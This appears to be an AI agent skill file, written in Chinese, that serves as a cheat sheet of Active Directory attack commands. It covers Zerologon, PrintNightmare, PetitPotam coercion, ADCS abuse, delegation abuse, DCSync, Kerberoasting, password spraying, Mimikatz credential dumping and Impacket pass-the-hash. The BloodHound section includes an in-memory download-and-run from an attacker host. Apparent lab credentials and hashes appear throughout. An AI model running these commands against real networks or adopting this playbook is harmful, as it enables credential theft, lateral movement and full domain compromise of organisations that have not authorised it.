---
name: ad-attack-ad-attack
description: Use when encountering active directory域环境攻击技术
---

# AD域攻击

## Info

- **Domain**: intranet
- **Tags**: intranet, ad, windows, domain

# AD域渗透攻击

## 1. Zerologon (CVE-2020-1472)

```bash
python3 cve-2020-1472.py -target 192.168.1.1 -save 192.168.1.1.txt
secretsdump.py -hashes :[NTLMHASH] 'DOMAIN/TARGET$@192.168.1.1'
```

## 2. PrintNightmare (CVE-2021-1675)

```bash
python3 printnightmare.py domain/user:password@target_ip
```

## 3. PetitPotam

```bash
python3 PetitPotam.py attacker_ip target_ip
```

## 4. noPac/SAMAccountName

```bash
python3 noPac.py domain/user:password@target_ip
```

## 5. ADCS攻击

### ESC1

```bash
Certify.exe request /ca:ca-name /template:TemplateName /alt:target@domain.com
```

### ESC8

```bash
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs
```

## 6. 约束委派

### S4U2Self + S4U2Proxy 原理

- **S4U2Self**: 服务在没有用户 TGT 时，向 KDC 申请"代表用户访问自身"的可转发票据
- **S4U2Proxy**: 用 S4U2Self 票据申请"代表用户访问目标服务"的票据

```bash
# 约束委派利用
getST.py -spn cifs/target.domain.com -dc-ip dc.domain.com domain/user:password
```

## 6.1 非约束委派

当服务账户启用 Unconstrained Delegation，任何用户认证时其 TGT 会被缓存在服务主机 LSASS 中。

```bash
# 诱骗 DC 连接（Print Spooler）
SpoolSample.exe DC01 WEB01
# 或 PetitPotam
python3 PetitPotam.py \\WEB01 DC01

# 提取票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# 注入票据
mimikatz.exe "kerberos::ptt DC01$@krbtgt-DOMAIN.kirbi" "exit"

# DCSync
mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"
```

## 6.2 基于资源的约束委派（RBCD）

无需域管理员权限，只需能修改目标机器账户的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性。

```bash
# 方式1: 通过 NTLM Relay + PetitPotam 设置 RBCD
ntlmrelayx.py -t ldap://DC_IP --delegate-access --escalate-user 'attacker$'
python3 PetitPotam.py -u user -p pass -d domain \\ATTACKER_IP TARGET_IP

# 方式2: 有 GenericWrite 权限直接设置
python3 rbcd.py -u bob -p Password123 -d domain \
  --delegate-to TARGET-SRV$ --delegate-from bob dc.domain.com

# 申请 Administrator 票据
getST.py -spn cifs/TARGET-SRV.domain.com -impersonate administrator \
  -hashes :NTHASH domain/bob -dc-ip DC_IP

# Kerberos 登录
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain/administrator@TARGET-SRV
```

## 7. 资源约束委派

```bash
rbcd.py -action write -target 'dc' -delegate-from 'attacker$' -delegate-to 'target$' -dc-ip dc.domain.com
```

## 8. DCSync

```bash
secretsdump.py domain/user:password@dc_ip
```

## 9. DCShadow

需要域管理员权限

## 10. 跨域攻击

### 信任关系利用

```
mimikatz::lsadump::dcsync
```

## 11. Kerberoasting 攻击

**原理**: 任何域用户都可请求任意 SPN 的服务票据（ST），ST 用服务账户的 NTLM 哈希加密。拿到 ST 后可离线暴力破解。

```bash
# 请求所有 SPN 票据
impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf

# hashcat 破解（模式 13100）
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**前提**: 服务账户使用弱密码，以普通用户账户（非机器账户）运行服务并注册了 SPN。

## 12. 域信息搜集（BloodHound）

```bash
# 在目标机上执行（需高权限）
SharpHound.exe -c All

# PowerShell 内存加载（无文件落地）
IEX(IWR 'http://<attacker>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All

# 下载数据
download C:\Users\Public\bloodhound_data.zip
```

导入 BloodHound 后分析：GenericWrite 权限、委派关系、可达路径。

## 13. 密码喷洒

```bash
# CrackMapExec 密码喷洒（成功后继续）
crackmapexec smb 192.168.1.106 -u /root/Desktop/users.txt -p 'Password@1' --continue-on-success

# 通过 RID 爆破枚举用户
crackmapexec smb 192.168.1.106 -u /root/Desktop/users.txt -p 'Password@1' --rid-brute
```

## 14. Rubeus 票据操作

```bash
# 明文申请 TGT
Rubeus.exe asktgt /user:administrator /password:admin@123 /nowrap /ptt

# 哈希申请 TGT
Rubeus.exe asktgt /user:administrator /rc4:579DA618CFBFA85247ACF1F800A280A4 /enctype:RC4 /nowrap /ptt

# 请求 CIFS 服务票据
Rubeus.exe asktgs /service:"cifs/WIN-3EAQBB8A70H.tmac.com" /nowrap /ptt

# 请求 LDAP 服务票据（用于 DCSync）
Rubeus.exe asktgs /service:"ldap/WIN-3EAQBB8A70H.tmac.com" /nowrap /ptt

# DCSync 需要显式申请 LDAP 票据
mimikatz.exe "lsadump::dcsync /domain:tmac.com /user:krbtgt /csv" "exit"
```

## 15. WebClient 服务利用

WebClient 访问 `http://attacker` 时自动发送当前用户的 NTLM 凭据。

```bash
# 探测启用了 WebClient 的主机
crackmapexec smb 192.168.1.0/24 -u user -p pass -M webdav

# 强制触发认证（PetitPotam）
python3 PetitPotam.py -u user -p pass -d domain \\ATTACKER_IP\share TARGET_IP

# 检查状态
sc query WebClient
```

## 16. Mimikatz 常用命令

```bash
# 提取凭据
privilege::debug
sekurlsa::logonpasswords full

# DCSync
lsadump::dcsync /domain:xiaorang.lab /user:administrator
lsadump::dcsync /domain:xiaorang.lab /all

# 导出票据
sekurlsa::tickets /export
kerberos::ptt Administrator@krbtgt-XIAORANG.LAB.kirbi
```

## 17. Impacket 工具链速查

```bash
# 哈希传递横向移动
psexec.py -hashes :NTHASH ./Administrator@172.22.3.2

# SMB 共享浏览
smbclient.py -hashes :NTHASH xiaorang.lab/administrator@172.22.3.26

# DCSync 远程
secretsdump.py xiaorang.lab/user@172.22.3.2 -hashes :NTHASH -just-dc

# Exchange 哈希传递
pthexchange.py --target https://172.22.3.9 --username Lumia --password "LM:NT" --action Download

# ACL 修改（给用户添加 DCSync 权限）
dacledit.py xiaorang.lab/MACHINE$ -hashes :NTHASH -action write -rights DCSync -principal user -target-dn "DC=xiaorang,DC=lab"

# 查找委派关系
findDelegation.py xiaorang.lab/'MACHINE$' -hashes :NTHASH

# DFSCoerce 强制认证
dfscoerce.py -u "MACHINE$" -hashes :NTHASH -d xiaorang.lab machine 172.22.4.7
```